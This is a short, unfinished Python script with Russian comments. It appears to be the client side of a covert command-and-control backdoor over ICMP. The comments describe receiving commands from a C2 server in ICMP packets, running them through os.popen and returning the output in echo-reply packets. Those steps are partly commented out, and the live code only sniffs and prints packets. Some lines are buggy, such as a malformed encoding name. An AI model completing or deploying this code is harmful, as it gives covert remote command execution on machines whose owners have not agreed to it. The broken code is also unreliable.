#!/usr/bin/env python3
import os
from scapy.all import *
def main():
    while True:
        # ждём от C2-сервера ICMP-сообщение с командой
        rx = sniff(count=1)
        if ICMP in rx[0]:
                print(rx[0][IP].load.decode("'latin-1'").encode("utf-8"))
        #if Raw in rx[0]:
            #print(rx[0][Raw].load.decode("'latin-1'").encode("utf-8"))
        # извлекаем из пакета полезную нагрузку
            #var = rx[0][Raw].load.decode('latin-1').encode("utf-8")
        # запускаем команду и сохраняем результат
        #res = os.popen(var).read()
        # создаём ICMP-пакет с результатом в качестве полезной нагрузки
        #send(IP(dst="localhost")/ICMP(type="echo-reply", id=0x0001, seq=0x1)/res)
if __name__ == "__main__":
    main()
# import socket
# import struct
 
# def listen(host):
    # s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    # s.bind((host,0))
    # s.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
    
    # while 1:
        # data = s.recvfrom(65535)[0]
        # ip_header = data[0:33]
        # ip_struct = struct.unpack('!BBHHHHHHBBH4s4s' , ip_header)
        # icmp_header = data[20:28]
        # icmp_type, code, checksum, packet_id, sequence = struct.unpack("bbHHh", icmp_header)

        #if socket.inet_ntoa(ip_struct[12]) == host:# and data[28:].decode('utf-8')!='':
            # print(data.decode('utf-8'))#.encode("utf-8"))
            #print('{} --> icmp: Type: {}, Code: {}, Data: {}'.format(socket.inet_ntoa(ip_struct[11]), *struct.unpack('BB', data[33:35]),data[35:].decode('utf-8')))            
            # res = os.popen(data[28:].decode('utf-8')).read()
            # print(res)
            # send(IP(dst="localhost")/ICMP(type="echo-reply", id=0x0001, seq=0x1)/res)            
# listen("192.168.0.111")
